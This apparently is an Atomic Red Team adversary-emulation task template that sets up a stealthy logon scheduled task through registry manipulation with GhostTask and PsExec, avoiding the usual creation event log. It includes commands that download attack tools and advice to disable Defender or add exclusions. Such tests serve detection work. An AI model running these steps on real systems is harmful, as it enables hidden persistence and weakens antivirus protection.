# data/content/task_templates/704333ca-cc12-4bcf-9916-101844881f54.json
{
  "id": "704333ca-cc12-4bcf-9916-101844881f54",
  "name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation",
  "description": "Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4",
      "type": "execute-command",
      "data": {
        "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "be901cee-ed91-4451-ba59-2c3477e371ac",
      "type": "execute-command",
      "data": {
        "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} \u003e nul",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "83bcd2fe-b640-462b-a6b8-6bb36ea6769d",
      "name": "Check dependency 1/2",
      "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9e79ee93-6d66-4e6e-85b2-d32679256b76",
      "name": "Resolve dependency 1/2",
      "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "aaab39cb-2f3d-4743-9dc1-15e9bbc2e4a0",
      "name": "Re-check dependency 1/2",
      "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7f607b60-aedb-46fb-9e9d-e0e631858ea3",
      "name": "Check dependency 2/2",
      "description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "fc58c20f-deab-41ee-ab98-4055fcbc1696",
      "name": "Resolve dependency 2/2",
      "description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "0bd71e55-279e-4cbd-b588-48e90572dde8",
      "name": "Re-check dependency 2/2",
      "description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4",
      "p": "on-success",
      "o": "be901cee-ed91-4451-ba59-2c3477e371ac"
    },
    {
      "s": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4",
      "p": "on-failure",
      "o": "be901cee-ed91-4451-ba59-2c3477e371ac"
    },
    {
      "s": "83bcd2fe-b640-462b-a6b8-6bb36ea6769d",
      "p": "on-success",
      "o": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4"
    },
    {
      "s": "83bcd2fe-b640-462b-a6b8-6bb36ea6769d",
      "p": "on-failure",
      "o": "9e79ee93-6d66-4e6e-85b2-d32679256b76"
    },
    {
      "s": "9e79ee93-6d66-4e6e-85b2-d32679256b76",
      "p": "on-success",
      "o": "aaab39cb-2f3d-4743-9dc1-15e9bbc2e4a0"
    },
    {
      "s": "aaab39cb-2f3d-4743-9dc1-15e9bbc2e4a0",
      "p": "on-failure",
      "o": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4"
    },
    {
      "s": "7f607b60-aedb-46fb-9e9d-e0e631858ea3",
      "p": "on-success",
      "o": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4"
    },
    {
      "s": "7f607b60-aedb-46fb-9e9d-e0e631858ea3",
      "p": "on-failure",
      "o": "fc58c20f-deab-41ee-ab98-4055fcbc1696"
    },
    {
      "s": "fc58c20f-deab-41ee-ab98-4055fcbc1696",
      "p": "on-success",
      "o": "0bd71e55-279e-4cbd-b588-48e90572dde8"
    },
    {
      "s": "0bd71e55-279e-4cbd-b588-48e90572dde8",
      "p": "on-failure",
      "o": "9fd91b70-8aa1-411c-b8c9-f5aa69bb24a4"
    }
  ],
  "tags": [
    "T1053.005",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "task_name",
      "type": "string",
      "description": "Name of the newly-added task",
      "value": "lilghostie"
    },
    {
      "name": "task_command",
      "type": "string",
      "description": "Command you want the task to execute",
      "value": "notepad.exe"
    },
    {
      "name": "target",
      "type": "string",
      "description": "System where the task should run",
      "value": "localhost"
    },
    {
      "name": "user_name",
      "type": "string",
      "description": "Username to authenticate with, such as ATOMICDOMAIN\\AtomicAdmin",
      "value": "$env:USERDOMAIN + '\\' + $env:USERNAME"
    }
  ]
}